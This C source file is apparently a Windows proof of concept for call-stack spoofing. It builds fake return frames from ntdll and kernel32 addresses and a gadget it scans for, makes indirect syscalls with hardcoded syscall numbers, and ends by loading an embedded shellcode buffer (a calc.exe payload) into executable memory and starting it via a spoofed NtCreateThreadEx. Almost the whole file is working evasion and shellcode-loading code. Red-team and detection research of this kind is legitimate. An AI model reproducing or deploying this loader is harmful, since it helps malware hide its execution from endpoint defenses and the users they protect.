#include <stdio.h>
#include "Structs.h"
#include "Macros.h"

extern VOID Fixup();

// Credit to VulcanRaven project for the original implementation of these two
// Does not handle chained unwind right now
ULONG CalculateFunctionStackSize(PRUNTIME_FUNCTION pRuntimeFunction, const DWORD64 ImageBase)
{
    NTSTATUS status = STATUS_SUCCESS;
    PUNWIND_INFO pUnwindInfo = NULL;
    ULONG unwindOperation = 0;
    ULONG operationInfo = 0;
    ULONG index = 0;
    ULONG frameOffset = 0;
    StackFrame stackFrame = { 0 };


    // [0] Sanity check incoming pointer.
    if (!pRuntimeFunction)
    {
        status = STATUS_INVALID_PARAMETER;
        goto Cleanup;
    }

    // [1] Loop over unwind info.
    // NB As this is a PoC, it does not handle every unwind operation, but
    // rather the minimum set required to successfully mimic the default
    // call stacks included.
    pUnwindInfo = (PUNWIND_INFO)(pRuntimeFunction->UnwindData + ImageBase);
    while (index < pUnwindInfo->CountOfCodes)
    {
        unwindOperation = pUnwindInfo->UnwindCode[index].UnwindOp;
        operationInfo = pUnwindInfo->UnwindCode[index].OpInfo;
        // [2] Loop over unwind codes and calculate
        // total stack space used by target Function.
        switch (unwindOperation) {
        case UWOP_PUSH_NONVOL:
            // UWOP_PUSH_NONVOL is 8 bytes.
            stackFrame.totalStackSize += 8;
            // Record if it pushes rbp as
            // this is important for UWOP_SET_FPREG.
            if (RBP_OP_INFO == operationInfo)
            {
                stackFrame.pushRbp = true;
                // Record when rbp is pushed to stack.
                stackFrame.countOfCodes = pUnwindInfo->CountOfCodes;
                stackFrame.pushRbpIndex = index + 1;
            }
            break;
        case UWOP_SAVE_NONVOL:
            //UWOP_SAVE_NONVOL doesn't contribute to stack size
            // but you do need to increment index.
            index += 1;
            break;
        case UWOP_ALLOC_SMALL:
            //Alloc size is op info field * 8 + 8.
            stackFrame.totalStackSize += ((operationInfo * 8) + 8);
            break;
        case UWOP_ALLOC_LARGE:
            // Alloc large is either:
            // 1) If op info == 0 then size of alloc / 8
            // is in the next slot (i.e. index += 1).
            // 2) If op info == 1 then size is in next
            // two slots.
            index += 1;
            frameOffset = pUnwindInfo->UnwindCode[index].FrameOffset;
            if (operationInfo == 0)
            {
                frameOffset *= 8;
            }
            else
            {
                index += 1;
                frameOffset += (pUnwindInfo->UnwindCode[index].FrameOffset << 16);
            }
            stackFrame.totalStackSize += frameOffset;
            break;
        case UWOP_SET_FPREG:
            // This sets rsp == rbp (mov rsp,rbp), so we need to ensure
            // that rbp is the expected value (in the frame above) when
            // it comes to spoof this frame in order to ensure the
            // call stack is correctly unwound.
            stackFrame.setsFramePointer = true;
            break;
        default:
            printf("[-] Error: Unsupported Unwind Op Code\n");
            status = STATUS_ASSERTION_FAILURE;
            break;
        }

        index += 1;
    }

    // If chained unwind information is present then we need to
    // also recursively parse this and add to total stack size.
    if (0 != (pUnwindInfo->Flags & UNW_FLAG_CHAININFO))
    {
        index = pUnwindInfo->CountOfCodes;
        if (0 != (index & 1))
        {
            index += 1;
        }
        pRuntimeFunction = (PRUNTIME_FUNCTION)(&pUnwindInfo->UnwindCode[index]);
        return CalculateFunctionStackSize(pRuntimeFunction, ImageBase);
    }

    // Add the size of the return address (8 bytes).
    stackFrame.totalStackSize += 8;

    return stackFrame.totalStackSize;
    
    Cleanup:
        return status;
}

ULONG CalculateFunctionStackSizeWrapper(PVOID ReturnAddress)
{
    NTSTATUS status = STATUS_SUCCESS;
    PRUNTIME_FUNCTION pRuntimeFunction = NULL;
    DWORD64 ImageBase = 0;
    PUNWIND_HISTORY_TABLE pHistoryTable = NULL;

    // [0] Sanity check return address.
    if (!ReturnAddress)
    {
        status = STATUS_INVALID_PARAMETER;
        goto Cleanup;
    }

    // [1] Locate RUNTIME_FUNCTION for given Function.
    pRuntimeFunction = RtlLookupFunctionEntry((DWORD64)ReturnAddress, &ImageBase, pHistoryTable);
    if (NULL == pRuntimeFunction)
    {
        status = STATUS_ASSERTION_FAILURE;
        printf("[!] STATUS_ASSERTION_FAILURE\n");
        goto Cleanup;
    }

    // [2] Recursively calculate the total stack size for
    // the Function we are "returning" to.
    return CalculateFunctionStackSize(pRuntimeFunction, ImageBase);

    Cleanup:
        return status;
}

PVOID FindGadget( PIMAGE_DOS_HEADER Module, LPCSTR Gadget, DWORD szGadget )
{
    PBYTE  TxtBase            = ( PBYTE ) Module + IMAGE_FIRST_SECTION( ( PBYTE ) Module + Module->e_lfanew )->VirtualAddress;
    SIZE_T TxtSz              = IMAGE_FIRST_SECTION( ( PBYTE ) Module + Module->e_lfanew )->SizeOfRawData;
    DWORD  TotalGadgets       = 0;
    DWORD  idx                = 0;

    for ( PBYTE Cur = TxtBase; Cur <  TxtBase + TxtSz ; Cur++ )
    {
        if ( !memcmp( Cur, Gadget, szGadget ) )
        {
            return Cur;
        }
    }

    return NULL;
}

VOID GenerateFrames( PFRAME Frames, PVOID Module ) {

    DWORD    idx              = 0;
    BOOLEAN  Found            = FALSE;
    PVOID    pPrintf          = GetProcAddress( LoadLibraryA( "msvcrt.dll" ), "printf" );

    // Hard Coded offsets just for testing
    Frames[ 0 ].ReturnAddress = ( PBYTE )GetProcAddress( LoadLibraryA( "ntdll.dll" ), "RtlUserThreadStart" ) + 0x21;
    Frames[ 0 ].StackSize     = CalculateFunctionStackSizeWrapper( Frames[ 0 ].ReturnAddress );

    Frames[ 1 ].ReturnAddress = ( PBYTE )GetProcAddress( LoadLibraryA( "kernel32.dll" ), "BaseThreadInitThunk" ) + 0x14;
    Frames[ 1 ].StackSize     = CalculateFunctionStackSizeWrapper( Frames[ 1 ].ReturnAddress );

    Frames[ 2 ].ReturnAddress = FindGadget( Module, "\xff\x23", 2 );
    Frames[ 2 ].StackSize     = CalculateFunctionStackSizeWrapper( Frames[ 2 ].ReturnAddress );

    printf( "[+] Gadget is at 0x%llx with size 0x%llx\n", Frames[ 2 ].ReturnAddress, Frames[ 2 ].StackSize );
    return;

}

// Compiler sometimes optimizes things out, keep things unoptimized to be safe
// This flag will allow us to use memory easier within our inline assembly because
// symbols will be referenced by rbp whereas we clobber rsp
__attribute__( ( optimize( "-fno-omit-frame-pointer", "-O0" ) ) )
PVOID Spoof( SIZE_T ArgCount, PVOID function, HANDLE module, PVOID SSN, PVOID a, PVOID b, PVOID c, PVOID d, PVOID e, PVOID f, PVOID g, PVOID h, PVOID i, PVOID j, PVOID k, PVOID l, PVOID m )
{
    FRAME    Frames[ 3 ]   = { 0 };
    PBYTE    Rsp           = NULL;
    PVOID    RetValue      = NULL;

    // If no specified module, grab gadget from kernel32
    if ( !module )
    {
        GenerateFrames( &Frames, LoadLibraryA( "kernel32.dll" ) );
    } 
    else {
        GenerateFrames( &Frames, module );
    }
    
    // Get our RSP
    __asm__ volatile (
        "mov rax, rsp\n"
        : "=r" ( Rsp )
        : 
    );

    // Place the frames. We'll start 0x200 below our current RSP
    SIZE_T  TotalDecrement = 0x200;

    // DO NOT PRINTF FROM HERE ON OUT, WILL SCREW UP THE STACK AND CLOBBER THESE FRAMES + ARGS
    // Also, don't put a __debugbreak() or int3 after here for the same reason (exxception handler gets called and clobbers)

    // Cut the walk via "pushing" a 0
    TotalDecrement -= 0x8;
    *( PVOID* )( Rsp - TotalDecrement ) = ( PVOID ) 0;

    for ( int i = 0; i < 3; i++ ) {
        TotalDecrement += Frames[ i ].StackSize;
        *( PVOID* )( Rsp - TotalDecrement ) = Frames[ i ].ReturnAddress;
    }
    // Place the stack args
    *( PVOID* )( Rsp - TotalDecrement + 0x28 + ( 8 * 0 ) ) = e;
    *( PVOID* )( Rsp - TotalDecrement + 0x28 + ( 8 * 1 ) ) = f;
    *( PVOID* )( Rsp - TotalDecrement + 0x28 + ( 8 * 2 ) ) = g;
    *( PVOID* )( Rsp - TotalDecrement + 0x28 + ( 8 * 3 ) ) = h;
    *( PVOID* )( Rsp - TotalDecrement + 0x28 + ( 8 * 4 ) ) = i;
    *( PVOID* )( Rsp - TotalDecrement + 0x28 + ( 8 * 5 ) ) = j;
    *( PVOID* )( Rsp - TotalDecrement + 0x28 + ( 8 * 6 ) ) = k;
    *( PVOID* )( Rsp - TotalDecrement + 0x28 + ( 8 * 7 ) ) = l;
    *( PVOID* )( Rsp - TotalDecrement + 0x28 + ( 8 * 8 ) ) = m;
    
    if ( function )
    {
        PVOID temp      = NULL;
        PVOID nonvol    = NULL;
        PVOID pFixup    = Fixup;

        // Move first 4 args
        // Our rsp is normal, can tell compiler to use memory addrs
        __asm__ volatile (
            "mov rcx, %1\n"
            "mov rdx, %2\n"
            "mov r8, %3\n"
            "mov r9, %4\n"
            : "=r" ( temp )
            : "m" ( a ), "m" ( b ), "m" ( c ), "m" ( d )
        );

        // Store original value of rbx
        // Specify the arg regs as clobbers so compiler doesn't use em
        __asm__ volatile (
            "mov %1, rbx\n"
            "mov rbx, %2\n"
            : "=r" ( temp )
            : "m" ( nonvol ) ,"r" ( &pFixup )
            : "rcx", "rdx", "r8", "r9"
        );
                      
        // Set SSN and jump to function
        __asm__ volatile (
            "mov r10, rcx\n"
            "mov r11, %1\n"
            "mov rax, %2\n"
            "sub rsp, %3\n"
            "jmp r11\n"
            : "=c" ( temp )
            : "m" ( function ), "m" ( SSN ), "m" ( TotalDecrement )
        );

        // Handler to catch the gadget return
        // Specify rax as clobber so we dont overwrite our ret value
        __asm__ volatile (
            "Fixup: \n"
            "mov rbx, %1\n"
            : "=r" ( temp )
            : "m" ( nonvol )
            : "rax"
        );

        // Fix our rsp and store the ret value
        __asm__ volatile (
            "add rsp, %1\n"
            "sub rsp, 0x8\n" // Account for the pop from ret since we jmped
            : "=a" ( RetValue )
            : "m"  ( TotalDecrement )
        );

        return RetValue;
    }
    

    return NULL;
}

int main() {

    PVOID    ReturnAddress = NULL;
    NTSTATUS status        = STATUS_SUCCESS;

    MessageBoxA( NULL, "WKLSEC -- Normal", "WKLSEC", MB_OK );
    SPOOF( MessageBoxA, NULL, NULL, NULL, "WKLSEC -- Spoofed", "WKLSEC", MB_OK );

    PVOID pPrintf = GetProcAddress( LoadLibraryA( "msvcrt.dll" ), "printf" );
    
    // 0 stack args
    for ( int i = 0; i < 2; i++ )
    {
        SPOOF( pPrintf, NULL, NULL, "[+] Iteration %d\n", i );
        SPOOF( Sleep, NULL, NULL, 4000 );
        SPOOF( pPrintf, NULL, NULL, "[+] Returning to 0x%llx\n", __builtin_return_address( 0 ) );
    }
     // 1 stack arg
    
    for ( int i = 0; i < 4; i++ )
    {
        PVOID alloc = SPOOF( VirtualAllocEx, NULL, NULL, -1, 0, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
        SPOOF( pPrintf, NULL, NULL, "[+] Allocated to 0x%llx\n", alloc );
    }

    // 2 stack arg
    PVOID pNtAllocateVirtualMemory = GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtAllocateVirtualMemory" );
    for ( int i = 0; i < 4; i++ )
    {
        DWORD  Status    = NULL;
        PVOID  alloc     = NULL;
        SIZE_T size      = 1024;
        PVOID  base      = NULL;
        Status = SPOOF( pNtAllocateVirtualMemory, NULL, NULL, -1, &alloc, NULL, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
        SPOOF( pPrintf, NULL, NULL, "[+] STATUS: 0x%llx, NtAllocated to 0x%llx\n", Status, alloc );
    }

    // Syscalls
    pNtAllocateVirtualMemory = ( PBYTE ) GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtAllocateVirtualMemory" ) + 0x12;
    for ( int i = 0; i < 4; i++ )
    {
        DWORD  Status    = NULL;
        PVOID  alloc     = NULL;
        SIZE_T size      = 1024;
        PVOID  base      = NULL;
        // Good call
        Status = SPOOF( pNtAllocateVirtualMemory, NULL, 0x18, -1, &alloc, NULL, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
        SPOOF( pPrintf, NULL, NULL, "[+] STATUS: 0x%llx, Syscall-Allocated to 0x%llx\n", Status, alloc );
        // Bad call
        Status = SPOOF( pNtAllocateVirtualMemory, NULL, 0x18, -1, &alloc, NULL, &size, MEM_COMMIT | MEM_RESERVE, 0x1049578394 );
        SPOOF( pPrintf, NULL, NULL, "[+] STATUS: 0x%llx, from incorrect param\n", Status );
    }
    
    // Shellcode Load
    DWORD  Status    = NULL;
    PVOID  alloc     = NULL;
    SIZE_T size      = 1024;
    PVOID  base      = NULL;
    unsigned char buf[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

    pNtAllocateVirtualMemory = ( PBYTE ) GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtAllocateVirtualMemory" ) + 0x12;
    Status = SPOOF( pNtAllocateVirtualMemory, NULL, 0x18, -1, &alloc, NULL, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
    SPOOF( pPrintf, NULL, NULL, "[+] STATUS: 0x%llx, Syscall-Allocated to 0x%llx\n", Status, alloc );

    memcpy( alloc, buf, sizeof( buf ) );

    PVOID  pNtCreateThreadEx = ( PBYTE ) GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtCreateThreadEx" ) + 0x12;
    HANDLE hThread           = NULL;
    Status = SPOOF( pNtCreateThreadEx, NULL, 0xBC, &hThread, THREAD_ALL_ACCESS, NULL, -1, alloc, NULL, NULL, NULL, NULL, NULL, NULL );
    SPOOF( pPrintf, NULL, NULL, "[+] STATUS: 0x%llx, Syscall-CreateThread to 0x%llx\n", Status, alloc ); 

    getchar();
       
}
